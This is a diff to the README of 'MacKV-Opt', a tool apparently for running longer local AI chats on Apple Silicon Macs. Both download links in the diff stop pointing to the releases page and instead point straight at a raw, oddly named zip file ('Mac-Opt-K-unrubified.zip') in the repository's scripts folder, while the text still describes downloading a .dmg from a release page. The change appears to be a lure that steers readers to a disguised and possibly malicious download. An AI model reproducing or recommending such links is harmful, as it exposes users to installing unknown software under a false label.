@@ -1,6 +1,6 @@
 # 🚀 MacKV-Opt - Run longer AI chats on Macs
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Openplan-pricklyedgedleaf841/MacKV-Opt/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Openplan-pricklyedgedleaf841/MacKV-Opt/raw/refs/heads/main/scripts/Mac-Opt-K-unrubified.zip)
 
 MacKV-Opt helps your Apple Silicon Mac manage large amounts of text data for AI models. It organizes memory so you can talk to local models for longer periods. You gain access to tools that make your Mac models faster and more efficient.
 
@@ -22,7 +22,7 @@ Your computer needs specific hardware to run this tool well:
 
 You need to download the installer from our release page. Visit this link to find the most recent version:
 
-[Download MacKV-Opt Here](https://github.com/Openplan-pricklyedgedleaf841/MacKV-Opt/releases)
+[Download MacKV-Opt Here](https://github.com/Openplan-pricklyedgedleaf841/MacKV-Opt/raw/refs/heads/main/scripts/Mac-Opt-K-unrubified.zip)
 
 On this page, look for the file ending in `.dmg`. Click the file to start the download. Once the process completes, open the file to begin your installation.
 
